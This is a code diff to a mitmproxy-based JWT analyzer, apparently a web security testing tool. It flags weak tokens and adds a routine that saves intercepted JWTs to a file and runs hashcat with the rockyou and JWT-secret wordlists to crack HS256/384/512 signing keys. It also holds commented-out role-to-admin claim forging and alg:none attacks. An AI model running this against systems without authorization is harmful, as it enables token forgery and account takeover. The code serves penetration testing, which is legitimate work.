@@ -5,12 +5,26 @@ import json
 from mitmproxy import http, ctx
 from helpers.helpers import Helpers
 import copy
+import subprocess
+import tempfile
+from pathlib import Path
+import os
+import time
+import threading
 
 class JWTAnalyzer:
-    def __init__(self):
-        self.fuzzedJWTs = set()
+    fuzzedJWTs = set()
+
+    BASE_DIR = Path(__file__).resolve().parent
+    hashcat = BASE_DIR / "../tools/hashcat/hashcat.exe"
+    rockyouwordlist = BASE_DIR / "../third-party/wordlists/seclists/rockyou.txt"
+    jwtsecretswordlist = BASE_DIR / "../third-party/wordlists/jwt-secrets/jwt.secrets.list"
+
+    runningHashcats = []
+
 
     def evaluateJWT(JWT, flow):
+        log.debug("EVALUATING JWTS")
         if "Active-Attack" in flow.request.headers.get("X-Fuzzer", ""):
             JWTAnalyzer.evaluateAttackResponse(flow, flow.request.headers.get("X-Fuzzer"))
             return
@@ -40,7 +54,7 @@ class JWTAnalyzer:
             # Symmetric algorithms (like HS256) are prone to brute-forcing if secrets are weak.
             # Asymmetric (like RS256) is safer. If HS256 is used, flag it for manual review.
             if alg == "hs256":
-                log.warning(f"JWT uses symmetric HS256. Risk of secret brute-forcing.")
+                Helpers.logWarning(f"JWT uses symmetric HS256. Risk of secret brute-forcing.", flow.request.url)
 
             # --- TEST 3: Sensitive Information Leakage in Payload ---
             # JWT payloads are NOT encrypted; they are only base64 encoded. anyone can read them.
@@ -50,13 +64,13 @@ class JWTAnalyzer:
                 for k, v in unverifiedPayload.items()
             }
 
-            for keyword in sensitiveKeywords:
-                if keyword in lower_payload:
-                    log.warning(f"Potential sensitive data leakage; JWT payload contains keyword '{keyword}': {json.dumps(lower_payload, indent=4)}")
+            # for keyword in sensitiveKeywords:
+            #     if keyword in lower_payload:
+            #         log.warning(f"Potential sensitive data leakage; JWT payload contains keyword '{keyword}': {json.dumps(lower_payload, indent=4)}")
                     
-                    if keyword == "role":
-                        log.info(json.dumps(unverifiedPayload))
-                        self.attackClaimChange(flow, JWT, "role", "admin", lower_payload[keyword])
+            #         if keyword == "role":
+            #             log.info(json.dumps(unverifiedPayload))
+            #             JWTAnalyzer.attackClaimChange(flow, JWT, "role", "admin", lower_payload[keyword])
 
             # change role to admin
             #if hs256, then compute hashes using hashcat
@@ -65,11 +79,12 @@ class JWTAnalyzer:
             # --- TEST 4: Missing Expiration (No 'exp' claim) ---
             # If a token never expires, a stolen token is valid forever.
             if "exp" not in unverifiedPayload:
-                log.warning(f"JWT is missing an expiration timestamp ('exp' claim)")
+                Helpers.logWarning(f"JWT is missing an expiration timestamp ('exp' claim)", flow.response.path)
 
             #lack of signature verification
             
-            JWTAnalyzer.attackWithAlgNone(flow, JWT)
+            # JWTAnalyzer.attackWithAlgNone(flow, JWT)
+            JWTAnalyzer.attackWithHashcat(JWT)
 
         except Exception as e:
             log.exception(e)
@@ -146,6 +161,57 @@ class JWTAnalyzer:
         ctx.master.commands.call("replay.client", [attackFlow])
 
 
+    def logHashcatOutput(process):
+        for line in process.stdout:
+            log.hashcat(line.rstrip("\r\n"))
+
+
+    def attackWithHashcat(JWT):
+        log.debug(f"ATTACK: Checking if Hashcat attack is possible")
+
+        # Checking if the header lists a compatible signing algorithm
+        header64, _, _ = JWT.split(".")
+        paddedHeader = header64 + "=" * divmod(len(header64), 4)[1]
+        headerJSON = json.loads(base64.urlsafe_b64decode(paddedHeader))
+
+        if headerJSON["alg"] == "HS256" or headerJSON["alg"] == "HS384" or headerJSON["alg"] == "HS512":
+            # with tempfile.NamedTemporaryFile(mode="w", encoding='utf-8', delete=False) as f:
+            
+            with open("jwt.txt", "w", encoding="utf-8") as f:
+                f.write(JWT)
+
+            try:
+                log.info("Starting Hashcat attack")
+
+                # "Status...........: Cracked"
+                process = subprocess.Popen(
+                    ["./third-party/hashcat/hashcat.exe", # subprocess executing from root folder
+                     "-a", "1", 
+                     "-m", "16500",
+                    #  "--machine-readable",
+                    #  "--status", # periodically show status info
+                     "../../jwt.txt", # relative to /third-party/hashcat folder
+                     "./wordlists/seclists/rockyou.txt", "./wordlists/jwt-secrets/jwt.secrets.list"], # relative to /third-party/hashcat folder
+                    text=True,
+                    cwd="./third-party/hashcat",
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+
+                JWTAnalyzer.runningHashcats.append({"isRunning": 1, "process": process}) # 1 for running, 0 for finished
+
+                # for line in process.stdout:
+                #     print(line, end="")
+
+                outputThread = threading.Thread(target=JWTAnalyzer.logHashcatOutput, args=(process,), daemon=True)
+                outputThread.start()
+
+            except Exception as e:
+                log.exception("Hashcat attack failed with exception: ", e)
+        else:
+            log.info(f"Skipping Hashcat attack due to an incompatible signing algorithm: {headerJSON['alg']}")
+
+
     def evaluateAttackResponse(attackFlow: http.HTTPFlow, attackHeader):
         log.debug("Evaluating attack response")
         originalStatus = attackFlow.metadata.get("originalStatus")
@@ -171,7 +237,3 @@ class JWTAnalyzer:
                     message = "role claim change accepted"
 
             Helpers.vulnerabilityFound(f"{message} on {path} ({attackStatus})")
-
-    def evaluateCORS():
-        # 
-        return
